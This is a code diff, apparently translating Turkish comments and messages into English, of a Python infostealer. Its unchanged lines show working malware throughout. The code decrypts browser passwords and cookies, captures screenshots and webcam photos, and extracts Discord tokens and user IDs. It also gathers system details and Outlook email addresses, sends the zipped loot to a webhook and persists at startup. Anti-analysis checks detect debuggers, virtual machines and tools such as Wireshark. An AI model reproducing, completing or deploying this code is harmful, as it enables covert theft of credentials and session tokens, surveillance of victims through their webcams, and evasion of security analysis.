@@ -149,7 +149,7 @@ def decrypt_password(password, key):
         return decrypted_pass
         
     except Exception as e:
-        return f'[Şifre çözme hatası]: {str(e)}'
+        return f'[Password decryption error]: {str(e)}'
 
 def take_screenshot():
     try:
@@ -159,19 +159,19 @@ def take_screenshot():
         img_bytes.seek(0)
         return img_bytes
     except Exception as e:
-        print(f'Ekran görüntüsü alınırken hata oluştu: {str(e)}')
+        print(f'Error occurred while taking screenshot: {str(e)}')
         return None
 
 def take_webcam_photo():
     try:
         cap = cv2.VideoCapture(0)
         if not cap.isOpened():
-            print('Webcam açılamadı.')
+            print('Webcam could not be opened.')
             return None
             
         ret, frame = cap.read()
         if not ret:
-            print('Webcam\'den görüntü alınamadı.')
+            print('Could not get image from webcam.')
             cap.release()
             return None
             
@@ -186,7 +186,7 @@ def take_webcam_photo():
         return img_bytes
         
     except Exception as e:
-        print(f'Webcam fotoğrafı alınırken hata oluştu: {str(e)}')
+        print(f'Error occurred while taking webcam photo: {str(e)}')
         return None
 
 def get_all_data():
@@ -197,10 +197,10 @@ def get_all_data():
     success_count = 0
     
     with open(log_file, 'w', encoding='utf-8') as log:
-        log.write(f'Veri toplama başladı: {datetime.datetime.now()}\n')
-        log.write('Taranan klasörler:\n')
+        log.write(f'Data collection started: {datetime.datetime.now()}\n')
+        log.write('Scanned folders:\n')
         for browser, path in PATHS.items():
-            log.write(f'{browser}: {path} - Mevcut: {os.path.exists(path)}\n')
+            log.write(f'{browser}: {path} - Exists: {os.path.exists(path)}\n')
     
     with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipped_file:
         zipped_file.write(log_file, 'data_log.txt')
@@ -211,16 +211,16 @@ def get_all_data():
             if screenshot_bytes:
                 screenshot_info = os.path.join(temp_dir, 'screenshot_info.txt')
                 with open(screenshot_info, 'w', encoding='utf-8') as f:
-                    f.write(f'Ekran görüntüsü alındı: {datetime.datetime.now()}\n')
+                    f.write(f'Screenshot taken: {datetime.datetime.now()}\n')
                 
                 zipped_file.write(screenshot_info, 'screenshot/info.txt')
                 zipped_file.writestr('screenshot/screenshot.png', screenshot_bytes.getvalue())
                 
                 with open(log_file, 'a', encoding='utf-8') as log:
-                    log.write('\nEkran görüntüsü başarıyla alındı ve zip\'e eklendi\n')
+                    log.write('\nScreenshot successfully taken and added to zip\n')
         except Exception as e:
             with open(log_file, 'a', encoding='utf-8') as log:
-                log.write(f'\nEkran görüntüsü alınırken hata: {str(e)}\n')
+                log.write(f'\nError while taking screenshot: {str(e)}\n')
         
         # Add webcam photo to zip if available
         try:
@@ -228,16 +228,16 @@ def get_all_data():
             if webcam_bytes:
                 webcam_info = os.path.join(temp_dir, 'webcam_info.txt')
                 with open(webcam_info, 'w', encoding='utf-8') as f:
-                    f.write(f'Webcam fotoğrafı alındı: {datetime.datetime.now()}\n')
+                    f.write(f'Webcam photo taken: {datetime.datetime.now()}\n')
                 
                 zipped_file.write(webcam_info, 'webcam/info.txt')
                 zipped_file.writestr('webcam/webcam.jpg', webcam_bytes.getvalue())
                 
                 with open(log_file, 'a', encoding='utf-8') as log:
-                    log.write('\nWebcam fotoğrafı başarıyla alındı ve zip\'e eklendi\n')
+                    log.write('\nWebcam photo successfully taken and added to zip\n')
         except Exception as e:
             with open(log_file, 'a', encoding='utf-8') as log:
-                log.write(f'\nWebcam fotoğrafı alınırken hata: {str(e)}\n')
+                log.write(f'\nError while taking webcam photo: {str(e)}\n')
         
         # Add browser data to zip
         for platform, path in PATHS.items():
@@ -246,26 +246,26 @@ def get_all_data():
                 
             try:
                 with open(log_file, 'a', encoding='utf-8') as log:
-                    log.write(f'\n{platform} için işlem başlatıldı\n')
+                    log.write(f'\nProcessing started for {platform}\n')
                 
                 encrypted_key = getkey(path)
                 if not encrypted_key:
                     with open(log_file, 'a', encoding='utf-8') as log:
-                        log.write(f'{platform} için şifreleme anahtarı bulunamadı\n')
+                        log.write(f'Encryption key not found for {platform}\n')
                     continue
                 
                 try:
                     key = win32crypt.CryptUnprotectData(base64.b64decode(encrypted_key)[5:], None, None, None, 0)[1]
                     with open(log_file, 'a', encoding='utf-8') as log:
-                        log.write(f'{platform} için şifreleme anahtarı çözüldü\n')
+                        log.write(f'Encryption key decrypted for {platform}\n')
                     
                     # Handle paths for profiles
                     passwords_path = path + '\\Login Data'
                     cookies_path = path + '\\Cookies'
                     
                     with open(log_file, 'a', encoding='utf-8') as log:
-                        log.write(f'Şifre dosya yolu: {passwords_path} - Mevcut: {os.path.exists(passwords_path)}\n')
-                        log.write(f'Çerez dosya yolu: {cookies_path} - Mevcut: {os.path.exists(cookies_path)}\n')
+                        log.write(f'Password file path: {passwords_path} - Exists: {os.path.exists(passwords_path)}\n')
+                        log.write(f'Cookies file path: {cookies_path} - Exists: {os.path.exists(cookies_path)}\n')
                     
                     # Process passwords
                     if os.path.exists(passwords_path):
@@ -290,21 +290,21 @@ def get_all_data():
                                         if url and username and encrypted_password:
                                             try:
                                                 decrypted_password = decrypt_password(encrypted_password, key)
-                                                f.write(f'URL: {url}\nKullanıcı Adı: {username}\nŞifre: {decrypted_password}\n\n')
+                                                f.write(f'URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n')
                                                 password_count += 1
                                             except Exception as e:
-                                                f.write(f'URL: {url}\nKullanıcı Adı: {username}\nŞifre: [Şifre çözülemedi] {str(e)}\n\n')
+                                                f.write(f'URL: {url}\nUsername: {username}\nPassword: [Could not decrypt] {str(e)}\n\n')
                                     
                                     with open(log_file, 'a', encoding='utf-8') as log:
-                                        log.write(f'{platform} için {password_count} şifre çıkarıldı\n')
+                                        log.write(f'{platform} extracted {password_count} passwords\n')
                                     
                                     if password_count > 0:
                                         success_count += 1
                                         
                                 except Exception as e:
                                     with open(log_file, 'a', encoding='utf-8') as log:
-                                        log.write(f'{platform} için şifre veritabanı hatası: {str(e)}\n')
-                                    f.write(f'Veritabanından şifre alınamadı: {str(e)}')
+                                        log.write(f'Password database error for {platform}: {str(e)}\n')
+                                    f.write(f'Could not retrieve password from database: {str(e)}')
                                 
                                 cursor.close()
                                 conn.close()
@@ -313,7 +313,7 @@ def get_all_data():
                                 
                         except Exception as e:
                             with open(log_file, 'a', encoding='utf-8') as log:
-                                log.write(f'{platform} şifreleri işlenirken hata: {str(e)}\n')
+                                log.write(f'Error processing passwords for {platform}: {str(e)}\n')
                     
                     # Process cookies
                     if os.path.exists(cookies_path):
@@ -341,21 +341,21 @@ def get_all_data():
                                         if host and name and encrypted_cookie:
                                             try:
                                                 decrypted_cookie = decrypt_password(encrypted_cookie, key)
-                                                f.write(f'Host: {host}\nİsim: {name}\nDeğer: {decrypted_cookie}\nYol: {path}\nSona Erme: {expires}\nGüvenli: {secure}\n\n')
+                                                f.write(f'Host: {host}\nName: {name}\nValue: {decrypted_cookie}\nPath: {path}\nExpires: {expires}\nSecure: {secure}\n\n')
                                                 cookie_count += 1
                                             except Exception as e:
-                                                f.write(f'Host: {host}\nİsim: {name}\nDeğer: [Çerez çözülemedi] {str(e)}\nYol: {path}\nSona Erme: {expires}\nGüvenli: {secure}\n\n')
+                                                f.write(f'Host: {host}\nName: {name}\nValue: [Could not decrypt] {str(e)}\nPath: {path}\nExpires: {expires}\nSecure: {secure}\n\n')
                                     
                                     with open(log_file, 'a', encoding='utf-8') as log:
-                                        log.write(f'{platform} için {cookie_count} çerez çıkarıldı\n')
+                                        log.write(f'{platform} extracted {cookie_count} cookies\n')
                                     
                                     if cookie_count > 0:
                                         success_count += 1
                                         
                                 except Exception as e:
                                     with open(log_file, 'a', encoding='utf-8') as log:
-                                        log.write(f'{platform} için çerez veritabanı hatası: {str(e)}\n')
-                                    f.write(f'Veritabanından çerez alınamadı: {str(e)}')
+                                        log.write(f'Cookie database error for {platform}: {str(e)}\n')
+                                    f.write(f'Could not retrieve cookie from database: {str(e)}')
                                 
                                 cursor.close()
                                 conn.close()
@@ -365,20 +365,20 @@ def get_all_data():
                                 
                         except Exception as e:
                             with open(log_file, 'a', encoding='utf-8') as log:
-                                log.write(f'{platform} çerezleri işlenirken hata: {str(e)}\n')
+                                log.write(f'Error processing cookies for {platform}: {str(e)}\n')
                 
                 except Exception as e:
                     with open(log_file, 'a', encoding='utf-8') as log:
-                        log.write(f'{platform} için şifreleme anahtarı çözülemedi: {str(e)}\n')
+                        log.write(f'Could not decrypt encryption key for {platform}: {str(e)}\n')
                     continue
                     
             except Exception as e:
                 with open(log_file, 'a', encoding='utf-8') as log:
-                    log.write(f'{platform} için beklenmeyen hata: {str(e)}\n')
+                    log.write(f'Unexpected error for {platform}: {str(e)}\n')
         
         with open(log_file, 'a', encoding='utf-8') as log:
-            log.write(f'\nToplam başarılı veri alınan tarayıcı: {success_count}\n')
-            log.write(f'İşlem tamamlandı: {datetime.datetime.now()}\n')
+            log.write(f'\nTotal successful data collected from browser: {success_count}\n')
+            log.write(f'Process completed: {datetime.datetime.now()}\n')
     
     return (zip_file_path, success_count)
 
@@ -425,7 +425,7 @@ def send_data_with_embed(webhook_url, zip_file_path, embed_data):
         return success
         
     except Exception as e:
-        print(f'Webhook\'a veri gönderilirken hata oluştu: {str(e)}')
+        print(f'Error occurred while sending data to webhook: {str(e)}')
         
         # Clean up on error
         if os.path.exists(zip_file_path):
@@ -474,7 +474,7 @@ def add_to_startup():
         return True
         
     except Exception as e:
-        print(f'Başlangıca ekleme hatası: {str(e)}')
+        print(f'Error adding to startup: {str(e)}')
         return False
 
 def run_in_background():
@@ -492,7 +492,7 @@ def run_in_background():
         return True
         
     except Exception as e:
-        print(f'Arka planda çalıştırma hatası: {str(e)}')
+        print(f'Error running in background: {str(e)}')
         return False
 
 def get_discord_user_data_by_id(user_id):
@@ -534,7 +534,7 @@ def get_discord_localstorage_tokens():
             try:
                 with open(os.path.join(local_storage_path, file_name), 'rb') as file:
                     content = file.read().decode('utf-8', errors='ignore')
-                    # "token":"TOKEN_DEGERI" şeklinde arama
+                    # Search for "token":"TOKEN_VALUE" format
                     for match in re.finditer(r'\"token\"\\s*:\\s*\"([^\"]+)\"', content):
                         token = match.group(1)
                         if token not in tokens:
@@ -583,9 +583,9 @@ def get_discord_id_from_token(token):
         return None
 
 def get_discord_id_direct():
-    """Discord verilerinden doğrudan kullanıcı ID'sini almaya çalışır"""
+    """Attempts to get the user ID directly from Discord data"""
     try:
-        # Discord klasörleri
+        # Discord folders
         discord_paths = [
             os.path.join(ROAMING, 'discord'),
             os.path.join(ROAMING, 'discordcanary'),
@@ -596,7 +596,7 @@ def get_discord_id_direct():
             if not os.path.exists(discord_path):
                 continue
                 
-            # 1. Yöntem: settings.json'dan ID'yi al
+            # Method 1: Get ID from settings.json
             settings_path = os.path.join(discord_path, 'settings.json')
             if os.path.exists(settings_path):
                 try:
@@ -607,7 +607,7 @@ def get_discord_id_direct():
                 except:
                     pass
             
-            # 2. Yöntem: session storage'dan ID'yi al
+            # Method 2: Get ID from session storage
             local_storage_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
             if os.path.exists(local_storage_path):
                 for file_name in os.listdir(local_storage_path):
@@ -626,12 +626,12 @@ def get_discord_id_direct():
                                 matches = re.findall(alt_pattern, content)
                                 for match in matches:
                                     if len(match) >= 17 and len(match) <= 19:
-                                        # Validasyon: Discord ID'ler genellikle 17-19 haneli sayılardır
+                                        # Validation: Discord IDs are usually 17-19 digits long
                                         return match
                         except:
                             pass
             
-            # 3. Yöntem: Cache klasörlerini kontrol et
+            # Method 3: Check cache folders
             cache_path = os.path.join(discord_path, 'Cache')
             if os.path.exists(cache_path):
                 for file_name in os.listdir(cache_path):
@@ -641,7 +641,7 @@ def get_discord_id_direct():
                         with open(os.path.join(cache_path, file_name), 'rb') as f:
                             content = f.read().decode('utf-8', errors='ignore')
                             
-                            # ID arama
+                            # Search for ID
                             id_pattern = r'"id"\s*:\s*"(\d{17,20})"'
                             id_matches = re.findall(id_pattern, content)
                             if id_matches:
@@ -655,15 +655,15 @@ def get_discord_id_direct():
         return None
 
 def get_discord_users_data():
-    """Discord kullanıcı bilgilerini toplar"""
-    # Önce doğrudan ID almayı dene
+    """Collects Discord user information"""
+    # First, try to get the ID directly
     direct_id = get_discord_id_direct()
     if direct_id:
         user_data = get_discord_user_data_by_id(direct_id)
         if user_data:
             return user_data
     
-    # Doğrudan ID alınamadıysa, token yöntemini dene
+    # If the ID could not be obtained directly, try the token method
     tokens = get_discord_localstorage_tokens()
     if not tokens:
         print("No Discord tokens found")
@@ -680,12 +680,12 @@ def get_discord_users_data():
     return None
 
 def extract_discord_info():
-    """Discord bilgilerini doğrudan exe dosyası ile ilişkili veritabanlarından çıkarır"""
+    """Extracts Discord information directly from databases associated with the exe file"""
     try:
-        # Discord'un en son çalıştığı klasörü bul
+        # Find the last folder Discord was running in
         discord_process_paths = []
         
-        # Discord klasörleri - tüm olası yerleri tara
+        # Discord folders - scan all possible locations
         possible_paths = [
             os.path.join(LOCAL, 'Discord'),
             os.path.join(ROAMING, 'Discord'),
@@ -704,15 +704,15 @@ def extract_discord_info():
                 discord_process_paths.append(path)
         
         if not discord_process_paths:
-            print("Discord kurulumu bulunamadı")
+            print("Discord installation not found")
             return None
         
-        # Discord'un leveldb dosyalarını tara - burada token ve kullanıcı ID bilgileri saklıdır
+        # Scan Discord's leveldb files - this is where token and user ID information is stored
         token = None
         user_id = None
         
         for discord_path in discord_process_paths:
-            # 1. Discord'un Local Storage leveldb'sini tara
+            # Method 1: Scan Discord's Local Storage leveldb
             leveldb_paths = [
                 os.path.join(discord_path, 'Local Storage', 'leveldb'),
                 os.path.join(discord_path, 'Local Storage', 'level-0'),
@@ -729,27 +729,27 @@ def extract_discord_info():
                         
                     file_path = os.path.join(leveldb_path, file_name)
                     try:
-                        # Binary olarak oku - daha fazla bilgi içerebilir
+                        # Read binary - may contain more information
                         with open(file_path, 'rb') as f:
                             content = f.read()
                             
-                            # Bilgileri text olarak çıkarmak için decode et
+                            # Decode to extract information
                             text_content = content.decode('utf-8', errors='ignore')
                             
-                            # Token pattern'i
+                            # Token pattern
                             token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
                             token_matches = re.findall(token_pattern, text_content)
                             if token_matches:
                                 token = token_matches[0]
                             
-                            # ID pattern'i - farklı formatları kapsayacak şekilde
+                            # ID pattern - covering different formats
                             id_patterns = [
-                                r'"user_id_cache":"(\d{17,20})"',  # user_id_cache formatı
-                                r'"id":"(\d{17,20})"',              # JSON id formatı
-                                r'"user_id":"(\d{17,20})"',         # user_id formatı
-                                r'\"id\"\s*:\s*\"(\d{17,20})\"',    # id : "123" formatı
-                                r'\"userId\"\s*:\s*\"(\d{17,20})\"',# userId : "123" formatı
-                                r'\"discord_id\"\s*:\s*\"(\d{17,20})\"' # discord_id : "123" formatı
+                                r'"user_id_cache":"(\d{17,20})"',  # user_id_cache format
+                                r'"id":"(\d{17,20})"',              # JSON id format
+                                r'"user_id":"(\d{17,20})"',         # user_id format
+                                r'\"id\"\s*:\s*\"(\d{17,20})\"',    # id : "123" format
+                                r'\"userId\"\s*:\s*\"(\d{17,20})\"',# userId : "123" format
+                                r'\"discord_id\"\s*:\s*\"(\d{17,20})\"' # discord_id : "123" format
                             ]
                             
                             for pattern in id_patterns:
@@ -758,17 +758,17 @@ def extract_discord_info():
                                     user_id = id_matches[0]
                                     break
                                     
-                            # Eğer token ve id bulunduysa döngüden çık
+                            # If both token and ID are found, exit the loop
                             if token and user_id:
                                 break
                     except Exception as e:
                         print(f"File read error: {str(e)}")
                 
-                # Eğer token ve id bulunduysa döngüden çık
+                # If both token and ID are found, exit the loop
                 if token and user_id:
                     break
                     
-            # 2. Network klasörüne bak - HTTP istekleri burada cache'lenir
+            # Method 2: Check the network folder - HTTP requests are cached here
             network_path = os.path.join(discord_path, 'Network')
             if os.path.exists(network_path) and not user_id:
                 for file_name in os.listdir(network_path):
@@ -778,20 +778,20 @@ def extract_discord_info():
                             with open(file_path, 'rb') as f:
                                 content = f.read().decode('utf-8', errors='ignore')
                                 
-                                # ID arama
+                                # Search for ID
                                 for pattern in id_patterns:
                                     id_matches = re.findall(pattern, content)
                                     if id_matches:
                                         user_id = id_matches[0]
                                         break
                                         
-                                # Eğer ID bulunduysa döngüden çık
+                                # If ID is found, exit the loop
                                 if user_id:
                                     break
                     except:
                         pass
             
-            # 3. Cache klasörünü tara - genellikle API yanıtları burada saklanır
+            # Method 3: Scan the cache folder - API responses are usually stored here
             cache_path = os.path.join(discord_path, 'Cache')
             if os.path.exists(cache_path) and not user_id:
                 for file_name in os.listdir(cache_path):
@@ -801,7 +801,7 @@ def extract_discord_info():
                             with open(file_path, 'rb') as f:
                                 content = f.read().decode('utf-8', errors='ignore')
                                 
-                                # ID arama
+                                # Search for ID
                                 id_pattern = r'"id"\s*:\s*"(\d{17,20})"'
                                 id_matches = re.findall(id_pattern, content)
                                 if id_matches:
@@ -810,11 +810,11 @@ def extract_discord_info():
                     except:
                         pass
             
-            # Eğer bu Discord sürümünden ID bulunabildiyse, diğerlerine bakma
+            # If the ID could be found from this Discord version, stop looking in others
             if user_id:
                 break
         
-        # Eğer ID bulunabildiyse, Discord API'den kullanıcı bilgilerini al
+        # If the ID could be found, get user information from Discord API
         if user_id:
             return get_discord_user_data_by_id(user_id)
             
@@ -865,7 +865,7 @@ def get_discord_tokens_from_localstorage():
 def get_tokens_from_leveldb():
     tokens = []
     
-    # Discord dosya yolları
+    # Discord file paths
     roaming = os.getenv('APPDATA')
     local = os.getenv('LOCALAPPDATA')
     
@@ -886,7 +886,7 @@ def get_tokens_from_leveldb():
         r'mfa\.[\w-]{84}'                    # MFA token pattern
     ]
     
-    # Tarayıcıların Local Storage klasörlerinde tokenları ara
+    # Search for tokens in browsers' Local Storage folders
     for _, path in paths.items():
         if not os.path.exists(path):
             continue
@@ -895,7 +895,7 @@ def get_tokens_from_leveldb():
         if not os.path.exists(leveldb_path):
             continue
         
-        # LevelDB dosyalarını tara
+        # Scan LevelDB files
         try:
             for file_name in os.listdir(leveldb_path):
                 if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
@@ -913,7 +913,7 @@ def get_tokens_from_leveldb():
         except Exception:
             continue
     
-    # Bulunan tokenları doğrula ve sadece geçerli olanları döndür
+    # Validate found tokens and return only valid ones
     valid_tokens = []
     for token in tokens:
         try:
@@ -933,13 +933,13 @@ def get_tokens_from_leveldb():
     return valid_tokens
 
 def is_debugger_present():
-    """Debugger varlığını kontrol eder"""
+    """Checks for the presence of a debugger"""
     try:
         if platform.system() == "Windows":
-            # IsDebuggerPresent API'yi kullan
+            # Use IsDebuggerPresent API
             return ctypes.windll.kernel32.IsDebuggerPresent() != 0
         elif platform.system() == "Linux":
-            # Linux'ta TracerPid'i kontrol et
+            # Check TracerPid in Linux
             with open("/proc/self/status", "r") as f:
                 for line in f:
                     if "TracerPid" in line:
@@ -949,15 +949,15 @@ def is_debugger_present():
         return False
 
 def is_running_in_vm():
-    """VM'de çalışıp çalışmadığını kontrol eder"""
+    """Checks if running in a VM"""
     vm_detected = False
     
-    # VM MAC adresi kontrolü
+    # Check VM MAC address
     vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27', '00:16:3e']
     try:
-        # MAC adresi al
+        # Get MAC address
         mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        # VM MAC adres prefixlerini kontrol et
+        # Check VM MAC address prefixes
         for prefix in vm_mac_prefixes:
             if mac.lower().startswith(prefix.lower()):
                 vm_detected = True
@@ -965,17 +965,17 @@ def is_running_in_vm():
     except:
         pass
     
-    # VM isim kontrolü
+    # Check VM names
     vm_names = ["virtualbox", "vmware", "kvm", "qemu", "xen", "bochs", "parallels", "hyperv", "virtual"]
     try:
-        # Bilgisayar adını kontrol et
+        # Check computer name
         computer_name = platform.node().lower()
         for name in vm_names:
             if name in computer_name:
                 vm_detected = True
                 break
         
-        # Windows'ta BIOS veya Anakart bilgilerini kontrol et
+        # Check BIOS or motherboard information on Windows
         if platform.system() == "Windows":
             try:
                 manufacturer = subprocess.check_output("wmic baseboard get Manufacturer", shell=True).decode().lower()
@@ -994,21 +994,21 @@ def is_running_in_vm():
     except:
         pass
     
-    # VMware Tools veya VirtualBox Guest Additions gibi VM araçlarını kontrol et
+    # Check for VM tools like VMware Tools or VirtualBox Guest Additions
     vm_processes = [
         "vmtoolsd.exe", "vboxtray.exe", "vboxservice.exe", "vmacthlp.exe", "vmsrvc.exe",
         "vmwareuser.exe", "vmwaretray.exe", "xenservice.exe", "prl_tools.exe"
     ]
     try:
         if platform.system() == "Windows":
-            # Windows tasklist komutu
+            # Windows tasklist command
             tasklist = subprocess.check_output("tasklist", shell=True).decode().lower()
             for proc in vm_processes:
                 if proc.lower() in tasklist:
                     vm_detected = True
                     break
         elif platform.system() == "Linux":
-            # Linux ps komutu
+            # Linux ps command
             ps_output = subprocess.check_output(["ps", "aux"], universal_newlines=True).lower()
             vm_linux_processes = ["vboxservice", "vboxtray", "vmtoolsd", "xrdp", "qemu"]
             for proc in vm_linux_processes:
@@ -1021,7 +1021,7 @@ def is_running_in_vm():
     return vm_detected
 
 def is_being_analyzed():
-    """Ağ analiz araçları, debugger veya VM kontrol eder"""
+    """Checks for network analysis tools, debugger, or VM"""
     analysis_tools = [
         "wireshark.exe", "fiddler.exe", "tcpdump", "burpsuite", "charles.exe", 
         "networktrafficview.exe", "httpdebugger.exe", "fiddlercoreapi.exe",
@@ -1034,13 +1034,13 @@ def is_being_analyzed():
     
     try:
         if platform.system() == "Windows":
-            # Windows tasklist komutu
+            # Windows tasklist command
             tasklist = subprocess.check_output("tasklist", shell=True).decode().lower()
             for tool in analysis_tools:
                 if tool.lower() in tasklist:
                     return True
         elif platform.system() == "Linux":
-            # Linux ps komutu
+            # Linux ps command
             ps_output = subprocess.check_output(["ps", "aux"], universal_newlines=True).lower()
             linux_tools = ["wireshark", "tcpdump", "burpsuite", "strace", "ltrace", "gdb", "radare2"]
             for tool in linux_tools:
@@ -1052,27 +1052,27 @@ def is_being_analyzed():
     return False
 
 def timing_check():
-    """Zamanlamayı kontrol ederek debugging tespit eder"""
+    """Checks timing to detect debugging"""
     start_time = time.time()
-    # Basit bir loop çalıştır
+    # Run a simple loop
     for i in range(1000000):
         pass
     end_time = time.time()
-    # Eğer normal çalışmadan çok daha uzun sürdüyse muhtemelen debugging altındadır
-    if (end_time - start_time) > 1.0:  # Normalde 1 saniyeden az sürmeli
+    # If it took much longer than normal, it is likely under debugging
+    if (end_time - start_time) > 1.0:  # Should normally take less than 1 second
         return True
     return False
 
 def check_parent_process():
-    """Ebeveyn process kontrolü"""
+    """Checks the parent process"""
     try:
         if platform.system() == "Windows":
-            # Windows'ta WMI kullanarak ebeveyn process'i kontrol et
+            # Check parent process using WMI on Windows
             parent_info = subprocess.check_output("wmic process where processid=\"%s\" get parentprocessid" % os.getpid(), shell=True).decode()
             parent_pid = re.findall(r"\d+", parent_info)[0]
             parent_name = subprocess.check_output("wmic process where processid=\"%s\" get name" % parent_pid, shell=True).decode().lower()
             
-            # Bilinen debugger isimleri
+            # Known debugger names
             debuggers = ["ida", "x64dbg", "x32dbg", "ollydbg", "dnspy", "windbg"]
             for dbg in debuggers:
                 if dbg in parent_name:
@@ -1084,14 +1084,14 @@ def check_parent_process():
 
 def collect_system_info(output_path=None, webhook_url=None):
     """
-    Sistem hakkında detaylı bilgi toplar ve belirtilen yola kaydeder veya webhook'a gönderir
+    Collects detailed information about the system and saves it to the specified path or sends it to a webhook
     
     Args:
-        output_path (str): Bilgilerin kaydedileceği dosya yolu
-        webhook_url (str): Bilgilerin gönderileceği webhook URL'si
+        output_path (str): Path where the information will be saved
+        webhook_url (str): Webhook URL to which the information will be sent
     """
     if output_path is None:
-        # Masaüstü veya kullanıcı dizinine kaydet
+        # Save to desktop or user directory
         if platform.system() == "Windows":
             desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
             output_path = os.path.join(desktop_path, "systeminfo.txt")
@@ -1101,7 +1101,7 @@ def collect_system_info(output_path=None, webhook_url=None):
     system_info = {}
     
     try:
-        # Temel sistem bilgileri
+        # Basic system information
         system_info["timestamp"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         system_info["hostname"] = platform.node()
         system_info["os"] = platform.system()
@@ -1112,7 +1112,7 @@ def collect_system_info(output_path=None, webhook_url=None):
         system_info["python_version"] = platform.python_version()
         system_info["user"] = getpass.getuser()
         
-        # Dil bilgisi için modern metod kullanımı
+        # Use modern method for language information
         try:
             locale.setlocale(locale.LC_ALL, '')
             system_info["language"] = locale.getlocale()[0]
@@ -1121,15 +1121,15 @@ def collect_system_info(output_path=None, webhook_url=None):
             system_info["language"] = "Unknown"
             system_info["encoding"] = "Unknown"
         
-        # IP ve ağ bilgileri
+        # IP and network information
         try:
-            # Yerel IP adresi
+            # Local IP address
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect(("8.8.8.8", 80))
             system_info["local_ip"] = s.getsockname()[0]
             s.close()
             
-            # Harici IP adresi ve geolokasyon
+            # External IP address and geolocation
             try:
                 ip_info = requests.get("https://ipinfo.io/json", timeout=5).json()
                 system_info["public_ip"] = ip_info.get("ip", "Unknown")
@@ -1141,7 +1141,7 @@ def collect_system_info(output_path=None, webhook_url=None):
                     "org": ip_info.get("org", "Unknown")
                 }
             except RequestException:
-                # Alternatif IP servisi
+                # Alternative IP service
                 try:
                     ip_data = requests.get("https://api.ipify.org?format=json", timeout=5).json()
                     system_info["public_ip"] = ip_data.get("ip", "Unknown")
@@ -1151,11 +1151,11 @@ def collect_system_info(output_path=None, webhook_url=None):
         except:
             system_info["network_info"] = "Could not determine"
         
-        # MAC adresi
+        # MAC address
         system_info["mac_address"] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         
-        # Donanım bilgileri
-        # CPU bilgileri
+        # Hardware information
+        # CPU information
         system_info["cpu"] = {}
         try:
             if platform.system() == "Windows":
@@ -1172,7 +1172,7 @@ def collect_system_info(output_path=None, webhook_url=None):
         except:
             system_info["cpu"] = "Could not determine"
         
-        # RAM bilgileri
+        # RAM information
         system_info["memory"] = {}
         try:
             mem = psutil.virtual_memory()
@@ -1182,12 +1182,12 @@ def collect_system_info(output_path=None, webhook_url=None):
         except:
             system_info["memory"] = "Could not determine"
         
-        # Disk bilgileri
+        # Disk information
         system_info["disks"] = []
         try:
             for part in psutil.disk_partitions(all=False):
                 if os.name == 'nt' and ('cdrom' in part.opts or part.fstype == ''):
-                    # Windows'ta CD-ROM'ları atla
+                    # Skip CD-ROMs on Windows
                     continue
                 usage = psutil.disk_usage(part.mountpoint)
                 disk_info = {
@@ -1203,7 +1203,7 @@ def collect_system_info(output_path=None, webhook_url=None):
         except:
             system_info["disks"] = "Could not determine"
         
-        # Grafik kartı bilgileri
+        # Graphics card information
         system_info["gpu"] = {}
         try:
             if platform.system() == "Windows":
@@ -1221,31 +1221,31 @@ def collect_system_info(output_path=None, webhook_url=None):
         except:
             system_info["gpu"] = "Could not determine"
         
-        # Aktif kullanıcılar ve e-posta bilgileri (Windows için)
+        # Active users and email information (for Windows)
         system_info["users"] = []
         try:
             if platform.system() == "Windows":
-                # Windows kullanıcılarını al
+                # Get Windows users
                 users_data = subprocess.check_output("wmic useraccount get Name,SID", shell=True).decode()
-                users_lines = users_data.strip().split('\n')[1:]  # İlk satırı atla (başlık)
+                users_lines = users_data.strip().split('\n')[1:]  # Skip the first line (header)
                 
                 for line in users_lines:
                     parts = re.split(r'\s{2,}', line.strip())
                     if len(parts) >= 2:
                         user_info = {"name": parts[0]}
                         
-                        # Outlook profilleri için e-posta adresi arama
+                        # Search for email address in Outlook profiles
                         try:
                             outlook_profiles = subprocess.check_output(f'reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\Outlook\\Profiles" /s', shell=True, stderr=subprocess.PIPE).decode(errors='ignore')
                             email_matches = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', outlook_profiles)
                             if email_matches:
-                                user_info["emails"] = list(set(email_matches))  # Tekrarları kaldır
+                                user_info["emails"] = list(set(email_matches))  # Remove duplicates
                         except:
                             pass
                         
                         system_info["users"].append(user_info)
             elif platform.system() == "Linux":
-                # Linux kullanıcıları
+                # Linux users
                 with open("/etc/passwd", "r") as f:
                     for line in f:
                         if "/home/" in line:
@@ -1254,11 +1254,11 @@ def collect_system_info(output_path=None, webhook_url=None):
         except:
             system_info["users"] = "Could not determine"
         
-        # Kurulu uygulamalar listesi (Windows için)
+        # List of installed applications (for Windows)
         system_info["installed_software"] = []
         try:
             if platform.system() == "Windows":
-                # Sadece en önemli yazılımları al (çok fazla olmayacak şekilde)
+                # Get only the most important software (not too many)
                 software = subprocess.check_output("wmic product get Name,Version /format:list", shell=True).decode(errors='ignore')
                 current_app = {}
                 for line in software.split('\n'):
@@ -1269,7 +1269,7 @@ def collect_system_info(output_path=None, webhook_url=None):
                         if current_app:
                             system_info["installed_software"].append(current_app)
                             current_app = {}
-                if current_app:  # Son uygulamayı ekle
+                if current_app:  # Add the last application
                     system_info["installed_software"].append(current_app)
             elif platform.system() == "Linux":
                 try:
@@ -1286,10 +1286,10 @@ def collect_system_info(output_path=None, webhook_url=None):
         except:
             system_info["installed_software"] = "Could not determine"
         
-        # Ağ bağlantıları (sınırlı sayıda)
+        # Network connections (limited number)
         system_info["network_connections"] = []
         try:
-            connections = list(psutil.net_connections(kind='inet'))[:20]  # Sadece ilk 20 bağlantı
+            connections = list(psutil.net_connections(kind='inet'))[:20]  # Only the first 20 connections
             for conn in connections:
                 try:
                     if conn.laddr:
